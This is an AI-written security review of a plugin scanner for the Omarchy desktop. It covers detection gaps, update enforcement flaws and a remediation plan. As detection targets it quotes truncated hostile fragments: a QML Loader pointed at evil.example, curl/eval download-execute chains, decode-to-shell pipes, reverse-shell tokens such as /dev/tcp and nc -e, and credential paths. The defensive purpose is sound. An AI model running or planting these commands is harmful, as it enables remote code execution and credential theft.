# Review — Scan rule coverage vs. plugin install/use risk

Reviewer: Claude (Fable 5) · Date: 2026-08-27

Additional review: Codex senior security review · Date: 2026-08-27

Implementation plan: [`../plans/v0.2.1-hardening-implementation.md`](../plans/v0.2.1-hardening-implementation.md)

Revision 3 (2026-08-27): claims narrowed after adversarial review. Findings now carry
stable IDs (`R-n`) with priority and confidence as explicit fields, so a severity change
never forces renumbering. Revision 3 also separates analyzer identity from enforcement-policy
identity and records the native first-install boundary — see the correction tables below.

Scope: `crates/omasafe-analyzer/src/{rules,detect,payload,ingest,equivalence}.rs`,
`crates/omasafe-analyzer/equivalence/baseline-v3.json`, `crates/omasafe-cli/src/main.rs`,
the corpus expectation ledger, and `docs/reference/omarchy-security-surface.md` at `0c63a82`

Verification: source read on this machine. Runtime-reachability items are flagged for the
next security-surface reverification pass and must not be treated as verified until then.

## Verdict

The rule architecture is sound and unusually disciplined: every rule anchors to a verified
sink in `omarchy-security-surface.md`, capability observation is kept strictly separate from
findings, and coverage states make "no analyzer here" visible rather than silently clean.
Keep all of that.

But the catalog is scoped to *reachability of a sink*, not to several common
extension-ecosystem attack patterns: credential/wallet theft, clipboard/screen spying,
persistence, and remote payload loading. Their prevalence in the Omarchy plugin population
has not been measured, but the detector gaps are real and require no obfuscation to exercise.

The additional review found a second, independent problem: even a perfect rule catalog would
not yet protect the device throughout the plugin lifecycle. Analysis is advisory by default,
the daily timer does not run it, reviewed updates do not enforce High/Critical findings or
coverage loss, and one post-update uncertainty path continues to enable and trust content
that was not the content reviewed. Detector coverage and lifecycle enforcement must land
together; adding rules alone is insufficient.

A third theme emerged from narrowing the claims: **OmaSafe currently has no dataflow
analysis at all**, and several proposed rules only become trustworthy once bounded dataflow
exists. Co-occurrence of a sensitive read and a network capability is not evidence of
exfiltration, and shipping it as a finding would spend the project's precision budget on
guesses. Sequence the work so evidence quality leads enforcement.

Threat framing: an Omarchy plugin is QML + JS loaded **unsandboxed, with full user
permissions, inside the shared `omarchy-shell` process**, and may ship and invoke arbitrary
non-QML payloads. "Install or use" risk is therefore arbitrary code execution as the user on
first load — the bar for a finding-worthy rule is intent evidence, not exploitation proof.

**Priority legend** — P0: fail-open path or blocking-class miss that can silently admit
unreviewed execution. P1: high-impact lifecycle or missing-rule gap. P2: precision,
assurance, or defense-in-depth gap.

**Confidence legend** — *Source-confirmed*: reproduced by reading the code at `0c63a82`.
*Reachability pending*: the code path is confirmed, but whether the pinned runtime actually
honors it is unverified. *Design judgment*: an argued recommendation, not an observed defect.

---

## R-1 — Literal remote / out-of-tree component load is invisible

**Priority: P1, promoted to P0 if runtime reachability is confirmed and hardened policy
treats the family as blocking · Confidence: source-confirmed scanner miss; pinned-runtime
reachability pending**

`oma.qml.dynamic-reference` fires only on **computed** `Loader.source` values
(`detect.rs:1417`, the `Value::Dynamic` branch). A **literal** remote URL takes the other
branch and is silently dropped:

```qml
Loader { source: "https://evil.example/W.qml" }   // literal string
```

Trace:
- `classify_value` → `Value::Static("https://…")`.
- `is_path_shaped()` returns true (contains `/`), so it is pushed as a *reference candidate*
  (`detect.rs:1414`), not a finding.
- `resolve_reference()` (`detect.rs:324`) rejects anything containing `:` and returns
  `None` — **silently**. No finding, no capability, no limitation recorded.
- The network detectors only recognize `XMLHttpRequest` / `fetch` / `WebSocket`, so no
  network capability is attributed either.

The same silent drop hits absolute paths (`/tmp/staged.qml`) and `..`-traversal references:
`resolve_reference` rejects a leading `/` and inner `.`/`..` segments and returns `None`.

**What the underlying risk is, stated precisely.** Qt documents network-loaded
[`Loader.source`](https://doc.qt.io/qt-6/qml-qtquick-loader.html),
[remote directory imports](https://doc.qt.io/qt-6/qtqml-syntax-directoryimports.html), and
[`Qt.createComponent()` URLs](https://doc.qt.io/qt-6/qtqml-javascript-dynamicobjectcreation.html),
so the risk is credible on stock Qt. Three qualifications keep this honest:

- A remote *directory import* generally requires a `qmldir`, and some forms require an `as`
  qualifier — it is not a bare one-liner.
- The pinned Quickshell runtime may install URL interceptors or network restrictions.
  Reachability must be verified on the pinned build before the rule claims a verified anchor.
- An absolute path is **not a "containment escape"** — there is no runtime sandbox to escape.
  It is an *unreviewed out-of-tree load* that bypasses commit-bound review. That is the
  accurate harm: OmaSafe's whole value is binding review to an exact commit, and content
  loaded from outside the tree was never part of any reviewed commit.

**Recommend:**
- New rule `oma.qml.remote-component-load` (**High**): any URL-scheme literal in a reference
  position — `Loader.source`, `Qt.createComponent(...)`, and QML `import "https://…"`
  (`apply_import_surface`, `detect.rs:940`, checks nothing scheme-related today).
- New rule `oma.qml.out-of-tree-reference` (**Medium**): absolute-path or traversal
  references, described as unreviewed out-of-tree loads, not sandbox escapes.
- Add `Qt.createComponent(` and `Qt.include(` to the dynamic-code needle sets — the AST call
  list is only `eval | createQmlObject | atob` (`handle_call_expression`) and the lexical set
  matches (`detect.rs:684`).
- Reverification: confirm remote-QML reachability on the pinned Quickshell/Qt build (surface
  reference checklist step 3). If URL interception or network restriction is in force, ship
  as an indicator rather than a High finding — the literal remains intent evidence either way.

## R-2 — Rejected references vanish, but only sink-position ones should be reported

**Priority: P1 · Confidence: source-confirmed**

`resolve_reference` discards every reference it cannot resolve, with no limitation recorded.
That conflicts with the "never silently clean" contract — but the fix from revision 1
("report every unresolved reference as a limitation") would be badly noisy and is withdrawn.

`collect_ast_references` (`detect.rs:1857`) walks **every** `string` and `template_string`
node in the whole tree and keeps anything path-shaped. Most of those are not load or
execution sinks at all — they are labels, icon names, format strings, and URLs in comments
or config. Reporting all of their resolution failures would bury the real signal.

**Recommend:** record a rejected reference only when it occurs in a verified sink position —
`Loader.source`, `Qt.createComponent`, `Qt.include`, `Process.command`, `execDetached`,
`FileView.path` — and classify the rejection reason so reports can triage it:
`remote`, `absolute`, `traversal`, `missing-local-target`, `unsupported-scheme`.
Non-sink path-shaped strings stay inventory context, exactly as they are now.

## R-3 — Script download-execute evasions

**Priority: P1 · Confidence: source-confirmed**

`analyze_script_source` (`detect.rs:1177`) requires curl/wget **and** a `|`-to-interpreter
on the **same line**. Standard variants of the family the marketplace baseline treats as
blocking (`curl-pipe-shell`) are missed:

- Process-substitution / eval: `eval "$(curl …)"`, `source <(curl …)`, `bash <(wget …)` —
  no pipe character, no match.
- Staged multi-line: `curl -o /tmp/x` … `chmod +x /tmp/x` … `/tmp/x`.
- Decode-to-shell without a downloader: `echo <blob> | base64 -d | sh`,
  `openssl enc -d … | bash`, `xxd -r`. The obfuscation indicator won't fire either: in shell
  an unquoted base64 blob isn't a quoted literal, so `line_literals` never sees it.
- Reverse shells: `/dev/tcp/…`, `nc -e`, `socat exec:`, `bash -i >&`. Near-zero legitimate
  plugin use — a dedicated `oma.script.reverse-shell` (**High**) is the highest-signal,
  lowest-false-positive rule available and should ship early.

**Severity note (revised down from P0).** Shell and Python are explicitly always marked
`Partial` coverage, so a missed chain does not produce a clean coverage claim — the report
still says analysis was incomplete. This is a serious bypass of a High rule family, not a
silent all-clear. It returns to P0 only if a hardened policy starts promising that this rule
family is comprehensively blocking.

**Detecting the staged form requires new machinery, not reuse.** Revision 1 claimed the QML
path already performs cross-line network-response → execution analysis and that staged script
detection could follow it. That was wrong:

- `LexFlags.network` and `LexFlags.detached_any` are assigned in six places
  (`detect.rs:559,588,1476,1486,1778,1788`) and **read in none**. They are dead state.
- The existing "chain" finding is a substring test — `classify_value` (`detect.rs:1660`)
  returns `network-response-executed` when the *sink argument expression itself* contains
  `responseText`, `.response`, or `.text(`. There is no cross-statement or callback-aware
  taint tracking.
- Consequence beyond the original point: **the existing chain rule is itself evaded by one
  variable assignment** — `var d = xhr.responseText; Quickshell.execDetached(d)` classifies as
  a plain `dynamic-command` and stays capability-only.

So the recommendation is to **introduce bounded intra-file dataflow analysis** (assignment
tracking, then callback awareness), which serves R-3, R-6, and the R-1 computed-reference
case at once. It is new capability, not an extension of something already working.

**Related capability gap:** a bare `curl https://x -d "$data"` in a script, or in QML
`Process` argv, produces **no network capability** — scripts get capabilities only for
sudo/systemctl/package managers, and QML argv gets ProcessExecution only. Record
`NetworkAccess` for fetch tools in argv and scripts; egress attribution is a precondition
for any source-to-egress rule in R-5.

## R-4 — Reviewed update accepts dirty or unverifiable installed content

**Priority: P1 · Confidence: source-confirmed (impact High, likelihood constrained)**

`plugins review-update` analyzes a clean temporary checkout and retains that checkout's
`candidate_identity` (`main.rs:630-667`). After the native updater mutates the installed
checkout, the postcondition checks the installed `HEAD`, but its dirty-state handling fails
open:

- `dirty == Some(true)` marks the recovery flow as `failed` and prints a warning, but does
  not return (`main.rs:939-943`).
- `dirty == None` is not rejected at all, although the pre-update check correctly refuses the
  same uncertainty (`main.rs:493-503`).
- Execution then reaches plugin re-enable (`main.rs:961-980`) and advances trust using the
  clean temporary candidate's identity (`main.rs:983-989`), not a freshly verified identity
  of the installed bytes.

Result: bytes different from, or unverifiable against, the reviewed candidate can become live
while the accepted trust record describes the clean candidate. This breaks the documented
invariant that exact-commit and analysis postconditions pass before re-enable and trust.

**Severity note (revised down from P0).** The invariant violation is real and the path must
fail closed regardless. But reaching the bad state generally requires a concurrent same-user
writer, a problematic updater side effect, or an already-running malicious plugin — an
upstream commit alone may not be able to force a dirty checkout. Impact is High; likelihood
is constrained. Restore to P0 if a direct external-repository-only reproduction establishes
the dirty state.

**Recommend:** require `updated_record.dirty == Some(false)`; otherwise leave the plugin
disabled and return. Before re-enable, ingest the installed tree again and require its source
identity, analysis fingerprint, policy identity, and coverage state to match the approved
candidate. Advance trust only from this installed-tree identity, never from the staging
checkout.

## R-5 — User-data rules: start as capabilities, escalate on evidence

**Priority: P1 · Confidence: design judgment**

Public incidents in adjacent extension ecosystems include credential/wallet theft and
clipboard/screen spying, but this review did not establish prevalence for Omarchy plugins.
The actionable point does not depend on prevalence: the catalog has no rule for the *sources*
side. The filesystem rule's own guidance already says "raise priority for sensitive paths"
(`rules.rs:180`) and nothing implements it.

**Co-occurrence is not dataflow.** Revision 1 proposed escalating to High when a plugin has
both sensitive-path access and network capability. That is withdrawn: two unrelated
capabilities in one plugin is not evidence of exfiltration, and a rule built on it would
generate false positives on ordinary plugins. Every item below therefore **begins as a
capability or review indicator**, and escalates only on evidence of a sensitive source
connected to egress, hidden or background collection, dynamic attacker-controlled input, or
concrete suspicious persistence behavior. That escalation depends on the bounded dataflow
work in R-3.

- **Sensitive-path access** (`oma.qml.sensitive-path` + script equivalent, **capability**):
  literal paths touching `~/.ssh`, `~/.gnupg`, keyrings, browser profiles, `~/.aws`,
  `~/.config/gh`, `~/.kube`, wallet directories. Drop `/etc/shadow` from the High set — it is
  normally unreadable to the user, so its presence is an intent indicator at most.
- **Input injection** (**capability, escalating**): argv tokens `ydotool`, `wtype`, `wlrctl`,
  `hyprctl dispatch sendshortcut`. Synthetic keystrokes into a focused terminal are arbitrary
  command execution, but these tools also back legitimate accessibility and automation
  workflows. Escalate on background or timer-driven invocation, or dynamic keystroke content.
- **Screen capture** (**capability, escalating**): `grim`, `slurp`, `wf-recorder`, `hyprshot`.
  Legitimate for screenshot plugins. Escalate on timer/service-driven capture with no
  user-visible trigger, or capture combined with egress.
- **Clipboard via tools:** detection today is the literal token `clipboard` (`detect.rs:662`),
  so `wl-paste --watch <cmd>` — a persistent clipboard monitor, exactly the "continuous
  headless monitoring" the rule guidance flags — is missed. Add `wl-paste`, `cliphist`,
  `xclip`. Distinguish direction: `wl-copy` *writes* the clipboard and is not theft; the
  read-and-watch forms carry the risk.
- **Persistence expansion** (**capability, escalating**): scripts writing XDG autostart,
  `~/.config/systemd/user` unit files (via `cp`/`tee` — the `systemctl` token alone misses
  unit-file drops), shell rc files, `~/.config/environment.d`, `crontab`/`at`, and Hyprland
  `exec-once` lines in `~/.config/hypr/*`. Installing a user service can be entirely expected
  plugin behavior. The current manifest has no permission/capability declaration, so absence
  of a declared need is not evidence. Escalate only on concrete signals such as hidden or
  background activation, dynamic/untrusted content, a security-sensitive startup target, or
  a target clearly unrelated to the plugin's declared kind.
- **Privileged exec from shared temp** (**indicator, escalating**): `sudo`/`pkexec` of a
  `/tmp` or `/dev/shm` path is suspicious but does not by itself prove that an attacker can
  replace the target; a securely created, user-owned temporary file is possible. Escalate to
  a separate High finding only when the plugin creates or selects the target through an attacker-
  writable path, uses unsafe ownership/mode semantics, or dataflow ties an untrusted write to
  the privileged execution. This evidence-backed form closes the marketplace's
  `privileged-process-control-from-shared-temp` gap without equating a pathname with control.

## R-6 — Detection of anti-OmaSafe behavior (not self-protection)

**Priority: P1 · Confidence: design judgment**

**Framing correction.** Revision 1 called these "self-protection rules." They are not.
Once a plugin executes with the same user authority as OmaSafe, it can alter OmaSafe state,
binaries, timers, notifications, or sibling plugins through countless equivalent mechanisms;
static path rules can name the obvious ones and will never enumerate them all. These rules
are **detection of intent**, and should be described that way in reports so nobody reads a
quiet result as "OmaSafe is protected."

Real self-protection requires a stronger boundary — sandboxing, separate service authority,
protected state, or a pre-execution gate — and belongs on the roadmap alongside the v0.5
privileged-helper work, not in the rule catalog.

- **Tamper indicator (Medium):** script or QML writing into `~/.local/state/omasafe`, into
  other plugins' directories under `~/.config/omarchy/plugins/`, or running `git` against
  another plugin's checkout. High-signal intent evidence; not a control.
- **IPC-initiated plugin disable:** `setPluginEnabled` / `rescanPlugins` invoked *from plugin
  code*. Two corrections to revision 1: severity should not automatically be High, because
  disabling the bar widget does **not** disable the independent CLI and desktop-notification
  path that critical alerts already use by design; and the accessibility of `setPluginEnabled`
  from third-party plugin context must be **traced and verified on the pinned runtime** before
  any finding rule publishes. Ship as a capability with a verified anchor; if escalation is
  justified, publish a separate finding ID rather than changing the capability rule's meaning.
- **Bundled native binary, tiered by reachability** (replacing revision 1's flat High):
  - Unreferenced bundled binary → capability / inventory warning.
  - Referenced or executed from QML or a script → **Medium**.
  - Remote-downloaded, or digest changed outside an approved update → **High**. An expected
    binary digest change in a reviewed update is not independently suspicious.

  Hardened policy may still **block** a referenced executable until its exact digest is
  approved, but that is an enforcement decision, not a reason to reclassify the analyzer's
  Medium finding as High. Do not use generic “unsigned” as a predicate where the ecosystem
  has no signing convention.

  `PayloadKind::ElfBinary` and friends currently land in the inventory as `Unsupported`
  coverage and never enter the alert path at all, so even tier one is an improvement.

## R-7 — Lifecycle enforcement is advisory

**Priority: P1 · Confidence: source-confirmed**

A policy and control gap rather than a parser bug:

- `review-update` reduces candidate results to rule IDs, displays their delta, and accepts
  interactive or unattended approval regardless of catalog severity (`main.rs:630-647`,
  `724-800`). This conflicts with the High download-execute guidance to treat the result as
  blocking until fixed (`rules.rs:273-300`). `--yes --expected-commit` binds *what* is
  approved, but does not require an explicit override of *why* a blocking result is accepted.
- Partial/skipped/truncated/unsupported coverage is not an enforcement condition. Shell and
  Python are deliberately always `Partial`; native binaries and other interpreters are
  inventory-only. `review-update` prints aggregate limitation strings (`main.rs:765-770`) but
  does not present coverage-state counts or fail closed on an unreviewed executable.
- `scan --include-analysis` is opt-in (`main.rs:1044-1063`), while the installed daily timer
  runs only `scan --notify --only-new` (`main.rs:1827`). There is no OmaSafe-controlled
  install or first-enable command, so content can run before behavioral analysis is manually
  requested.
- New analyzer rule IDs are emitted as a generic `warning` (`main.rs:1580-1608`) instead of
  preserving catalog severity. `track_highest_severity` recognizes only `critical` and
  collapses every other nonempty value, including `error`, to `warning` (`main.rs:1710-1715`).

The advisory product thesis can remain the default reporting contract, but protecting an
end-user device requires an explicit **hardened lifecycle policy** as an opt-in mode:

1. For an already inactive installed tree, scan the exact bytes before enable/re-enable.
   Extend this to native first install only if reverification proves an inactive staging
   primitive that cannot hot-load content before the decision.
2. Block re-enable on unsuppressed High/Critical results, executable unsupported payloads
   without exact-digest approval, skipped/truncated analysis, stale surface, analyzer
   identity, or enforcement-policy identity, or failed installed-tree postconditions.
   `review-update` also requires its expected baseline diff; a genuine first review instead
   presents the full tree and must not fail merely because no historical baseline exists.
3. Permit an override only through a scoped, audited record bound to plugin ID, exact commit,
   tree/content digest, analyzer identity, enforcement-policy identity, rule IDs, coverage
   limitations, reason, and expiry.
4. Carry actual rule severity into scan alerts and notifications; enable analysis in the
   hardened daily schedule.
5. Make policy selection explicit on OmaSafe enable, reviewed update, and schedule-install
   commands. Preserve advisory as the compatibility default; never silently convert an
   existing advisory timer into the more expensive analysis schedule.

Severity-preserving notifications are worth shipping immediately. Scheduled analysis should
become the explicit hardened-schedule behavior: it has no blocking false-positive risk, but it
does change resource use and should not silently rewrite the advisory schedule.

An OmaSafe `plugins enable --policy hardened` command can enforce enable/re-enable only for
content that is already installed **and inactive**. It must not be described as a complete
first-install gate unless reverification proves a native inactive-staging primitive. If native
install places content directly in the hot-reloaded live directory, only an upstream
pre-activation hook (or an equally strong verified staging mechanism) closes that window.
Native install, enable, and update paths invoked outside OmaSafe remain detectable after the
fact, not prevented.

**Mechanism and blocking set are separable.** The enforcement *mechanism* — explicit policy
selection, enforcement-policy identity, override records, and blocking on coverage state,
identity staleness, unapproved executables, and failed postconditions — depends on no
precision measurement at all. Only the *rule-family blocking set* is gated on R-9. Shipping
them as one unit would hold the identity and override work behind corpus triage it does not
need, and would make the whole hardened mode unshippable if no family clears its threshold.
If none does, hardened mode with an empty blocking set is still the correct release outcome.

**`bar`-kind boundary.** A whole-bar plugin cannot be disabled without selecting another bar
(plugin-kind prioritization in `omarchy-security-surface.md`), so leaving one disabled after a
blocked hardened update degrades the desktop rather than a widget. Hardened mode must block
the *update* and leave the previously trusted revision live, not disable the plugin. Where the
prior revision cannot be restored, the recovery sequence must be printed before exit. The
independent CLI and desktop-notification paths still work with no bar, which is what makes
this recoverable rather than a lockout.

**Override trust boundary.** A plugin that is already running as the user can invoke the same
user CLI or alter user-owned OmaSafe state. Therefore an unattended `--yes` override is not a
meaningful authorization boundary, and a state-file audit record is not tamper-proof against
an already-compromised user session. v0.2.1 should require interactive override creation,
strict exact-identity fields, private atomic storage, and honest “auditable, not protected”
wording. Strong override authorization requires the separate-authority boundary already
identified in R-6. Hardened mode still reduces exposure before new untrusted content executes;
it does not recover the same-user boundary after another plugin has compromised it.

## R-8 — Published and mapped coverage exceeds implemented findings

**Priority: P1 · Confidence: source-confirmed**

- `oma.shell.ipc-injected-objects` is a catalog definition (`rules.rs:313-321`), but no
  detector emits that rule or its `ShellIpcInventory` capability. Treat it as planned coverage
  until an emitter inventories concrete callable methods and flags plugin-originated lifecycle
  mutation.
- The equivalence map marks `bundled-executable-binary` as `structural-equivalent`, while its
  own note admits the result is only a payload-inventory fact, not a capability or finding
  (`equivalence/baseline-v3.json:87-90`). Inventory presence is not an enforceable result;
  change the relation to the existing `partial-overlap` value and retain “inventory-only” in
  the note until referenced executable payloads produce review-visible results (R-6).
- **Fairness correction.** Revision 1 said OmaSafe "claims equivalence" for behaviors it does
  not detect. That was unfair and is withdrawn. The map is honest about its own coverage:
  of 15 entries, 4 are `not-covered`, 10 are `partial-overlap`, and exactly 1 is
  `structural-equivalent`. `cargo-git-unpinned`, `remote-git-execution-unpinned`,
  `privileged-process-control-from-shared-temp`, and `remote-build` are explicitly declared
  uncovered. The accurate statement is: *these are acknowledged external-baseline gaps that
  should stay prominent in reports and implementation planning.* The legitimate criticism is
  narrower — report consumers currently see map version metadata without a useful
  coverage-gap summary. Surface the `not-covered` set in every equivalence summary.
- Dynamic process arguments with no locally visible network provenance are intentionally
  capability-only (test `dynamic_identifier_binding_is_capability_only`). Bounded
  source-to-sink analysis (R-3) is what turns these into evidence: command interpolation,
  environment and user-controlled values, file and network reads, and callbacks within one
  file. Existing cross-file invocation edges may add reachability context, but v0.2.1 must not
  claim cross-file dataflow; that is explicitly later scope.

## R-9 — Precision and corpus assurance must precede enforcement

**Priority: P2 (gating) · Confidence: source-confirmed**

The lexical fallback has predictable false-positive pressure: raw `Polkit` / `PamContext`
tokens in quoted prose can become High findings, and `atob()` alone is treated as dynamic
code execution even when decoded bytes are never evaluated. Prefer real JavaScript, shell,
and Python parsers plus bounded intra-file dataflow; retain lexical matches as explicitly
lower-confidence indicators.

The parser corpus demonstrates excellent QML parse coverage but establishes neither rule
precision nor recall: `fixtures/corpus/expectations/dispositions.jsonl` contains zero triaged
records.

**Do not enforce High findings until precision evidence exists.** The hardened lifecycle
policy in R-7 is the right destination, but it must arrive on a staged ladder:

1. Audit-only reporting, at real catalog severity.
2. Populate corpus dispositions against real plugins and measure precision per rule family.
   Measure detection rate against independently labeled adversarial/mutation fixtures; an
   emitted-result ledger alone cannot measure recall because false negatives never enter it.
3. Block only on the families with demonstrated high precision (reverse-shell and the
   evidence-backed form of shared-temp privilege escalation are the likely first candidates).
4. Expand blocking as parsers and dataflow mature.
5. Preserve an exact-identity, audited override at every stage.

Add adversarial negative and boundary fixtures for every evasion in R-1 and R-3, and require
zero untriaged or known-false-positive blocking results in the release gate.

---

## Corrections from revision 1

Recorded so the delta is auditable rather than silently rewritten.

| Revision 1 claim | Correction |
|---|---|
| R-1 fully "Confirmed" P0 | Source-confirmed scanner miss; pinned-runtime reachability still pending. Absolute-path loads are unreviewed out-of-tree loads, not sandbox escapes — there is no sandbox to escape. |
| Report every unresolved reference as a limitation | Withdrawn as noisy: references are collected from every AST string. Report only sink-position rejections, with a typed reason. |
| Staged script detection can reuse existing cross-line QML analysis | Wrong — no such analysis exists. `LexFlags` is write-only; the chain test is a substring check inside the sink expression, itself evaded by one variable assignment. Introduce bounded dataflow instead. |
| R-3 is P0 | P1 — shell/Python coverage is always `Partial`, so a miss is not a clean claim. |
| R-4 is P0 | P1 — impact High, likelihood constrained by the need for a concurrent writer or already-running malicious plugin. |
| OmaSafe "claims equivalence" for missing behaviors | Unfair — the map declares 4 `not-covered` and 10 `partial-overlap`. Real gap is the missing coverage-gap summary for consumers. |
| Sensitive path + network capability → High | Withdrawn — co-occurrence is not dataflow. Start as capability; escalate on connected evidence. |
| Bundled binary → High finding | Tiered by reachability: unreferenced capability → referenced Medium → remote/unexpected-digest-change High. Hardened policy may separately require exact-digest approval. |
| IPC disable → High finding | Not automatically High; the CLI and notification path survives a disabled widget. Verify third-party reachability of `setPluginEnabled` first. |
| "Self-protection rules" | Detection of intent, not protection. Real self-protection needs a boundary, not a rule. |

## Corrections from revision 2

| Revision 2 claim | Correction |
|---|---|
| R-1 is immediately P0 | P1 while pinned-runtime reachability is pending and no hardened blocking promise exists; promote to P0 only when both conditions hold. |
| Adjacent extension malware establishes the dominant Omarchy risk | Unsupported prevalence claim. Adjacent incidents motivate tests, but the local scanner gaps stand on their own. |
| Any privileged execution from `/tmp` or `/dev/shm` is safely High | Pathname alone does not prove attacker control. Ship an indicator; require unsafe creation/ownership/mode or a connected untrusted-write edge for High. |
| Blocking inputs belong in analyzer `PolicyIdentity` | Keep analysis identity about analysis output. Add a separate enforcement-policy identity and bind overrides/decisions to both identities. |
| An OmaSafe enable command closes first-install exposure | Only for an already inactive tree. Native hot-reload install remains outside the preventive boundary until inactive staging or a pre-activation hook is verified. |
| A capability/indicator can later be promoted under the same rule ID | That violates the stable-meaning contract. Publish a separate evidence-backed finding ID; change blocking eligibility through enforcement-policy identity. |
| An unapproved referenced binary becomes a High analyzer finding in hardened mode | This conflates analysis with enforcement. Keep the evidence-based Medium severity; hardened policy may block until the exact digest is approved. |
| Corpus dispositions establish recall | They establish precision for emitted results. Recall needs independently labeled ground truth; publish adversarial/mutation fixture detection rate instead of an unsupported ecosystem-recall number. |
| A same-user `--yes` override is an authorization boundary | It is not: an already-running plugin can invoke the CLI or modify user-owned state. Require interactive creation in v0.2.1 and describe the record as auditable, not tamper-proof. |

## Process / contract impact

- Any rule addition bumps `RULE_CATALOG_VERSION` and carries a verified surface/payload
  anchor. Update the equivalence map only where the external relation actually changes:
  referenced bundled binaries improve the inventory-only relation; the evidence-backed
  shared-temp rule may move that entry to `partial-overlap`; unpinned remote Git remains an
  explicit unresolved gap in this plan.
- Lifecycle enforcement changes must version their inputs too, but separately from analyzer
  `PolicyIdentity`: blocking threshold, blocking-eligible rule set, coverage requirements,
  installed-tree postconditions, and override schema participate in an enforcement-policy
  identity. Decisions and overrides bind both identities. This preserves the existing meaning
  of analyzer identity while ensuring neither kind of policy change is mistaken for plugin
  drift.
- Preserve the current inert ingestion design. Filesystem scanning does not follow symlinks,
  pinned Git ingestion reads raw objects without hooks/submodules/LFS, and file/time/byte/
  cache limits expose coverage loss. The protection deficit is enforcement and dataflow
  coverage, not scanner-triggered execution.
- Install-time window: `scan-plugin --git URL --revision` already enables pre-install review;
  document scan → review → native install as a risk-reducing flow, not a closed gate. Unless
  native install can stage the exact reviewed tree inactive, a branch race or immediate hot
  reload can still execute different/unverified bytes. The pre-activation hook proposal in
  `later.md` is the clean boundary.
- Plugin/UI handoff: after the CLI contracts freeze, the panel should render source drift,
  analyzer improvement, and enforcement-policy change as distinct events; show coverage state
  independently from finding count; explain CLI-owned block reasons; expose `rules coverage`,
  schedule policy, and override expiry read-only; and never calculate policy or create an
  override in QML. Critical notifications remain independent of the bar widget.
- An enforcement outcome and the authority for it are separate facts. `override` is not an
  outcome; it is why one was permitted. Model them as `evaluation_state`
  (`evaluated`/`not-evaluated`), `outcome` (`allow`/`block`), and `authorization_basis`
  (`policy`/`override`/null), and keep blocking rule IDs populated when an override authorized
  an allow. A single collapsed enum leaves consumers unable to separate "allowed because
  policy passed" from "allowed despite blockers," which is the distinction that matters most
  for both display and audit.
- Consumer version skew is a boundary condition, not an implementation detail. The panel ships
  from a sibling repository on its own cadence, so a v0.2.1 hardened CLI will run behind a
  v0.2 panel for a guaranteed window, though a hardened block inside that window is
  conditional on the user opting in and a blocker firing. The old panel still shows findings
  and a warning badge, so what is missing is enforcement and recovery *semantics* — that an
  operation was blocked, why, and what to do — not a false clean state. The existing
  `cliVersionMin` floor guards only the opposite direction. Mitigate by notifying on state
  transitions rather than evaluations, and by persisting each decision so it stays recoverable
  through the CLI whether or not a notification was seen. Persistence, not notification, is
  the guarantee.
- Notification policy for overrides: every successful live-state transition authorized by an
  override — enable, re-enable, reviewed update — emits a warning-level, CLI-owned desktop
  notification. Read-only evaluation does not notify, so scans, status reads, override
  listing, and policy evaluation stay silent. Every *attempted* use is audited, including
  failures, and a failed mutation emits a separate failure/recovery notification. There is no
  age gate: under the same-user boundary an already-running plugin can create and immediately
  exercise its own override, so a fresh unexpected use is at least as important as a stale
  one — age is context in the payload, not a filter on delivery. The payload carries plugin
  ID, operation, rule IDs or count, override age and expiry, and an audit-event ID, and
  excludes raw reason and evidence text because a notification has no redaction surface.
  Delivery is best-effort: a notification failure warns on stderr and never rolls back the
  operation. Volume stays low by construction, since an exact-identity override is only
  "used" when it changes an otherwise-blocked lifecycle outcome.
- Whole-bar recovery has the same reachability problem as the alerts it replaces: a
  third-party whole-bar plugin suppresses OmaSafe's own widget, so recovery guidance for a
  blocked whole-bar update must reach the notification and CLI path rather than the panel
  alone.

## Priority order for implementation

1. **R-4** — fail closed on dirty/unknown post-update state; verify installed bytes before
   re-enable and trust. Smallest change, closes an invariant violation.
2. **R-7 (reporting half)** — carry real catalog severity into alerts and notifications.
   Add analysis to the explicit hardened schedule with the enforcement half.
3. **R-1** — remote and out-of-tree component load, plus `Qt.createComponent` / `Qt.include`
   needles; run the pinned-runtime reachability check in the same pass.
4. **R-3 (pattern half)** — reverse-shell rule, process-substitution and decode-to-shell
   variants, fetch-tool network capability.
5. **R-2** — typed sink-position reference rejections.
6. **R-3 (dataflow half)** — bounded intra-file dataflow; unblocks R-5 escalation, R-8
   source-to-sink, and the R-1 computed-reference case.
7. **R-6 / R-8** — anti-OmaSafe detection, tiered bundled-binary results, verified IPC
   emitter, Baseline V3 coverage-gap summary.
8. **R-5** — sensitive-path, input-injection, screen-capture, clipboard-tool, and persistence
   capabilities; escalation rules only after step 6.
9. **R-9** — populated disposition ledger and precision measurement, gating only the
   rule-family blocking set. Triage of the families expected to qualify can start as soon as
   they exist, concurrently with steps 6–8; the enforcement mechanism itself is not gated.
10. **Plugin/UI handoff** — after CLI JSON contracts freeze, surface enforcement decisions,
    coverage health, schedule policy, rule-coverage gaps, and override expiry through a
    read-only consumer contract; keep policy evaluation and override creation in the CLI.

**Analyzer-improvement consequence.** Step 6 changes results on rules that are already
published and already baselined — dataflow adds detections the substring heuristic missed, and
retiring that heuristic removes findings it produced spuriously. Under the identity contract
this is an *analyzer improvement* event and must not reuse source-drift wording: trust
baselines stay valid, and a suppression whose evidence predicate changed must surface for
re-confirmation rather than silently continuing or lapsing. This is the largest such event in
the remediation and needs its own tested path, not an assumption that the existing event
separation covers it.
